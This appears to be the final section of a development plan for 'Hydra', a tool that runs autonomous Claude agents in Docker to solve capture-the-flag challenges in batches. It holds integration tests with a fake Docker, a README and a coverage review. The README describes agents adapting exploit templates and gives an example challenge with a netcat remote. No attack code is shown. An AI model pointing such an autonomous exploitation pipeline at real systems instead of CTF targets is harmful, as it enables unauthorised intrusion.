from hydra.orchestrator import Orchestrator, OrchestratorConfig
from hydra.results import ResultsWriter

async def _run(root: Path, scenario: dict, *, parallel=1):
    scenario_path = Path(_SCENARIO_ENV)  # set by fixture below
    scenario_path.write_text(json.dumps(scenario))

    (root / "runs").mkdir(exist_ok=True)
    writer = ResultsWriter(
        jsonl_path=root / "results.jsonl",
        flags_path=root / "flags.json",
        results_path=root / "results.json",
    )
    cfg = OrchestratorConfig(
        parallel=parallel, timeout_s=5, model="m",
        image="hydra-worker", api_key="sk",
        runs_dir=root / "runs",
        failures_dir=root / "failures",
        prompt_volumes={},
    )
    orch = Orchestrator(cfg, writer=writer)
    return writer, orch

async def test_happy_path(tmp_path, fake_docker, monkeypatch):
    global _SCENARIO_ENV
    _SCENARIO_ENV = str(fake_docker)

    writer, orch = await _run(tmp_path, {
        "a": {"stdout": "working\nFLAG: flag{a_ok}\n", "exit_code": 0},
    })
    await orch.run([Challenge(name="a", description="x")])
    [r] = writer._results
    assert r.status == "solved"
    assert r.flag == "flag{a_ok}"
    flags = json.loads((tmp_path / "flags.json").read_text())
    assert flags["a"] == "flag{a_ok}"

async def test_failed_no_flag(tmp_path, fake_docker):
    global _SCENARIO_ENV
    _SCENARIO_ENV = str(fake_docker)
    writer, orch = await _run(tmp_path, {
        "a": {"stdout": "nothing to see\n", "exit_code": 0},
    })
    await orch.run([Challenge(name="a", description="x")])
    [r] = writer._results
    assert r.status == "failed"
    assert r.flag is None
    assert (tmp_path / "failures" / "a.md").exists()

async def test_flag_file_only(tmp_path, fake_docker):
    global _SCENARIO_ENV
    _SCENARIO_ENV = str(fake_docker)
    writer, orch = await _run(tmp_path, {
        "a": {"stdout": "", "flag_file": "flag{from_file}\n", "exit_code": 0},
    })
    await orch.run([Challenge(name="a", description="x")])
    [r] = writer._results
    assert r.status == "solved"
    assert r.flag == "flag{from_file}"

async def test_mixed_batch(tmp_path, fake_docker):
    global _SCENARIO_ENV
    _SCENARIO_ENV = str(fake_docker)
    writer, orch = await _run(tmp_path, {
        "a": {"stdout": "FLAG: flag{a}", "exit_code": 0},
        "b": {"stdout": "boom\n", "stderr": "explode", "exit_code": 1},
        "c": {"stdout": "", "flag_file": "CTF{c_ok}"},
    }, parallel=3)
    await orch.run([
        Challenge(name="a", description="x"),
        Challenge(name="b", description="x"),
        Challenge(name="c", description="x"),
    ])
    by_name = {r.name: r for r in writer._results}
    assert by_name["a"].status == "solved"
    assert by_name["b"].status == "error"
    assert by_name["c"].status == "solved"
```

- [ ] **Step 4: Run integration tests**

```bash
.venv/bin/pytest tests/integration/ -v
```
Expected: 4 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add tests/integration/
git commit -m "test(integration): full pipeline with fake docker"
```

---

## Task 30: README + final smoke

**Files:**
- Create: `README.md`

**Why:** Single entry point for humans. Cover: what it is, install, quickstart, example input JSON, config, where to look on failure.

- [ ] **Step 1: Write `README.md`**

````markdown
# Hydra

Autonomous CTF batch solver. JSON in, flags out.

```bash
hydra challenges.json
# ✓ baby-rsa    → flag{w1ener_w1ns}  (47s)
# ✓ login       → flag{sqli_r0ck5}   (2m13s)
# ✗ pwn2        → (timeout after 60m)
#
# solved 42/50 in 48m21s → ./flags.json
```

## How it works

For each challenge in the JSON, Hydra spawns a Docker container running `claude -p --model claude-opus-4-6` in parallel (N=8 by default). Inside the container, Claude reads `CLAUDE.md` → classifies the category → dispatches to a specialist subagent (pwn, crypto, web, rev, forensics, misc) → the specialist consults category-specific skill files and adapts exploit templates → writes the flag to `./flag.txt`. Hydra harvests the flag and writes it to `./flags.json`.

## Install

```bash
# Prereqs: Docker CE + Python 3.12 + an Anthropic API key
git clone <this-repo> && cd hydra
python3.12 -m venv .venv && .venv/bin/pip install -e ".[dev]"
docker build -t hydra-worker .        # ~10-20 min first time
export ANTHROPIC_API_KEY=sk-ant-...
```

## Input format

Flexible. Hydra sniffs field names. A minimal challenge object needs `name` (or `title`/`id`) AND at least one of `description`/`task`/`prompt` or `files`/`attachments`/`paths`:

```json
[
  {"name": "baby-rsa", "description": "Decrypt this.", "files": ["/path/to/chal.py"]},
  {"name": "login",    "description": "http://ctf.example.com:8080"},
  {"name": "pwn1", "category": "pwn", "points": 200, "description": "ret2libc",
   "files": ["/tmp/pwn1"], "remote": "nc chal.example.com 1337"}
]
```

## Output

- `./flags.json` — `{name: flag, ..., "__failed__": [names]}` for direct CTF platform upload.
- `./results.jsonl` — streamed one line per finished challenge, so `tail -f` during a live comp.
- `./results.json` — final aggregate with summary stats.
- `./runs/<name>/` — per-challenge artifacts: input files, scratch, logs, flag.
- `./failures/<name>.md` — human-readable failure digest for each unsolved challenge.
- `./failures/SUMMARY.md` — index of failures.

## Common flags

```bash
hydra challenges.json \
  --parallel 8 \         # concurrent workers
  --timeout 3600 \       # per-challenge wall-clock (seconds)
  --model claude-opus-4-6 \
  --only baby-rsa,login  # run only these names
  --retry-failed         # re-run entries that previously failed/timed out
```

Resume is automatic: re-running with the same output files skips solved entries. Combine with `--retry-failed` to also re-attempt failures.

## Debugging a failure

```bash
cat failures/SUMMARY.md           # overview
cat failures/<name>.md            # per-challenge digest (postmortem + log tail)
less runs/<name>/logs/claude.stdout.jsonl  # full agent transcript
ls  runs/<name>/work/             # solver scratch files
```

## Architecture

See [`docs/superpowers/specs/2026-04-14-hydra-ctf-agent-design.md`](docs/superpowers/specs/2026-04-14-hydra-ctf-agent-design.md).
````

- [ ] **Step 2: Full test run**

```bash
.venv/bin/pytest -v
```
Expected: all unit + integration tests PASS.

- [ ] **Step 3: Dry-run smoke**

```bash
ANTHROPIC_API_KEY=sk-dryrun .venv/bin/hydra tests/fixtures/challenges/smoke.json --dry-run
```
Expected: `dry-run: 2 challenges normalized`.

- [ ] **Step 4: Image existence check (optional, if Docker is built)**

```bash
docker image inspect hydra-worker >/dev/null && echo "image OK"
```

- [ ] **Step 5: Commit**

```bash
git add README.md
git commit -m "docs: README with quickstart, I/O format, debug tips"
```

---

## Plan complete

**Summary:**
- 30 tasks across scaffolding (1-2), orchestrator TDD (3-10), CLI wiring (11), Dockerfile (12-13), prompt stack (14-24), exploit templates (25-28), integration test (29), docs (30).
- Each code task follows RED→GREEN→COMMIT TDD. Content tasks write the file and commit.
- P1 acceptance: `pytest` green (unit + integration), image builds, dry-run smoke passes.
- E2E with real Docker + canned challenges is deferred to a P2 plan to keep this one focused.

## Spec coverage self-review

Mapping spec sections → tasks:
- §2 decisions: all locked in CLI (Task 10) and OrchestratorConfig (Task 9).
- §3 architecture (per-container docker): Tasks 8, 12-13.
- §4.1 orchestrator: Tasks 3–11.
- §4.2 Dockerfile: Tasks 12-13.
- §4.3 CLAUDE.md: Task 14.
- §4.4 6 specialists: Tasks 15–20.
- §4.5 8 skills: Tasks 21–24.
- §4.6 15 exploits: Tasks 25–28.
- §4.7 tests: Tasks 2–10 (unit), Task 29 (integration). E2E deferred.
- §5 data flow: Task 9 (orchestrator) + Task 11 (wiring).
- §6 CLI surface: Task 10.
- §7 repo layout: All tasks accumulated.
- §8 error handling: Task 9 (orchestrator) + Task 10 (CLI API-key check).
- §9 testing: Tasks 2–10 + 29.
- §10 P1 deliverables: all covered; P2 E2E + 5 canned challenges excluded (noted).
- §11 out-of-scope: respected.
- §12 success criteria: verifiable via Task 30.

No placeholders, no TBDs. All cross-references consistent.

---
